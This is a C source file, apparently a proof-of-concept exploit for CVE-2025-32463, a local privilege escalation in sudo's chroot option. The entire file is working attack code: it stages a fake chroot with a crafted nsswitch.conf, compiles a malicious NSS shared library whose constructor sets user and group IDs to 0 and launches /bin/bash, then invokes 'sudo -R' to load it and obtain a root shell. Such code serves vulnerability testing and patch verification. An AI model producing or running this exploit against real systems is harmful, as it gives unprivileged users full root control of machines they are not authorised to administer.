#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>
#include <errno.h>

/*
 * Following code will be executed as root. It is written down in one line for simplicity
 *
 * #include <stdlib.h>
 * #include <unistd.h>
 *
 * __attribute__((constructor)) void xoot(void)
 * {
 *       setreuid(0,0);
 *       setregid(0,0);
 *
 *       chdir("/");
 *
 *       execl("/bin/bash", "/bin/bash", NULL);
 * }
*/
const char XOOT[] = "#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void xoot(void)\n{\n        setreuid(0,0);\n        setregid(0,0);\n\n        chdir(\"/\");\n\n        execl(\"/bin/bash\", \"/bin/bash\", NULL);\n}\n";

/*
 * Auxiliar function for running commands in C using execvp
*/
static void runCommand(char *argv[]) {
    pid_t p = fork();
    if (p == 0) {
        execvp(argv[0], argv);
        perror("execvp");
        _exit(1);
    }
    waitpid(p, NULL, 0);
}

/*
 * Main function
*/

int main(void) {

    puts(
        "************************************\n"
        "*                                  *\n"
        "*          CVE-2025-32463          *\n"
        "*                                  *\n"
        "************************************\n"
    );

    puts("[+] Running exploit!");

    // Create temp folder - The Xs will be replaced by random characters
    char stage[] = "/tmp/sudo.stage.XXXXXX";

    // Check if folder is not already created
    while (!mkdtemp(stage)) {
        if (errno != EEXIST) {
            perror("mkdtemp");
            return 1;
        }
        // Delete the folder if it is created
        runCommand((char *[]){"rm", "-rf", stage, NULL});
    }

    // Change directory to the temp folder created
    chdir(stage);

    // Copy the code for getting root privileges into a new file
    FILE *f = fopen("xoot.c", "w");
    if (f == NULL) {
        perror("fopen");
        return 1;
    }

    fprintf(f, XOOT);
    fclose(f);

    // Creation of structure folders
    runCommand((char *[]){"mkdir", "-p", "xoot/etc", "libnss_", NULL});

    // Configuring custom NSS module
    // NSS will interpret /xoot as a custom service
    runCommand((char *[]){"sh", "-c", "echo 'passwd: /xoot' > xoot/etc/nsswitch.conf", NULL});

    // If the file /etc/group doesn't exist inside chroot, the exploit will be aborted
    // This is because sudo also needs to know things such as the groups an user belogs to
    runCommand((char *[]){"cp", "/etc/group", "xoot/etc", NULL});

    // Compiles the file xoot.c as a shared library (.so)
    // The function xoot will be automaticlly called after loading the library
    runCommand((char *[]){"gcc", "-shared", "-fPIC", "-Wl,-init,xoot", "-o", "libnss_/xoot.so.2", "xoot.c", NULL});

    puts("xoot!");

    // Root permission granted. -R = --chroot
    runCommand((char *[]){"sudo", "-R", "xoot", "xoot", NULL});
    runCommand((char *[]){"rm", "-rf", stage, NULL});

    return 0;
}
